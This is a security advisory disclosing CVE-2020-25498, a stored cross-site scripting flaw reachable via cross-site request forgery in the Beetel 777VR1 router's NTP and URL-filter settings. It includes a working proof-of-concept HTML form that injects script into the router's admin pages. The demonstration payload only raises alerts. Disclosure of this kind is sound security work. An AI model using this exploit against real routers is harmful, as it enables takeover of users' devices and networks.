# CVE-2020-25498: Stored XSS via CSRF in Beetel 777VR1 Router

## **[Vulnerability Description]()**

It has been identified that the vulnerable endpoint doesn't have server side input validation and lacks client side filtering for any malicious script injection. An attacker can use this vulnerability to inject malicious script in the endpoint and the script is activated every time a user opens the vulnerable endpoint. Attacker can send a malicious URL with POST request payload to execute XSS in admin module via CSRF to take over the device and finally, to take over the network.

**Researcher:** Sayli Ambure (https://twitter.com/sayli_ambure)  

**MITRE CVE link:** https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-25498

## **[Proof-of-Concept Exploit:]()**

**CSRF HTML Code:**
```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://192.168.1.1/form2ntp.cgi" method="POST">
      <input type="hidden" name="ntpstate" value="Enable" />
      <input type="hidden" name="ntpserver" value='google&#46;com"><script>alert(1)</script>' />
      <input type="hidden" name="ntpserver2" value='google&#46;com"><script>alert(2)</script>' />
      <input type="hidden" name="ntpinterval" value="1" />
      <input type="hidden" name="ntptimezone" value="330" />
      <input type="hidden" name="submit&#46;htm&#63;time&#46;htm" value="Send" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

### **[1. NTP Server Name in System Time configuration module]()**

**Parameter: Server name**

### **[Proof of Concept Video:]()**

<a href="http://www.youtube.com/watch?feature=player_embedded&v=qeVHvmS5wtI
" target="_blank"><img src="http://img.youtube.com/vi/qeVHvmS5wtI/0.jpg" 
 width="500" height="300" border="10" /></a>
 
 ### **[2. URL Filter endpoint in Firewall module]()**
 
 **Parameter: Keyword**
 
 ### **[Proof of Concept video:]()**
 
<a href="http://www.youtube.com/watch?feature=player_embedded&v=u_6yBIMF74A
" target="_blank"><img src="http://img.youtube.com/vi/u_6yBIMF74A/0.jpg" 
 width="500" height="300" border="10" /></a>
